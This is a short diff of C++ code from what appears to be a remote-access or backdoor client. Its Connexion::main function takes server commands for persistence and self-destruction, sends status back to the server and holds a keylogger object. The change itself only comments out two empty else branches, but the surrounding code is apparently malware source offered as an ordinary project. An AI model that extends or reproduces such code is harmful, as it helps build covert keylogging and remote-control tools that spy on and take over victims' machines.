@@ -131,11 +131,11 @@ INT Connexion::main()
                 {
                     sendSafe(L"MOD_PERSISTENCE:" SPLIT + int_to_wstring(error_codes));
                 }
-                else
-                {
-                    //cout << "broadcast persi" << endl;
-                    ;
-                }
+                //else
+                // {
+                //cout << "broadcast persi" << endl;
+                //    ;
+                // }
             }
             
             else if (command.substr(0,16) == L"MOD_DESTRUCTION:") 
@@ -150,11 +150,11 @@ INT Connexion::main()
                     sendSafe(L"MOD_DESTRUCTION:" SPLIT + int_to_wstring(error_codes)); //Send the statue to the server. The server will just display the status.
                 }
                 
-                else //else  substr(15,6) == "broadcast"
-                {
-                    //not send status
-                    ;
-                }
+                //else //else  substr(15,6) == "broadcast"
+                //{
+                //not send status
+                //    ;
+                //}
 
                 delete a_keylogger;
                 closeConnexion();
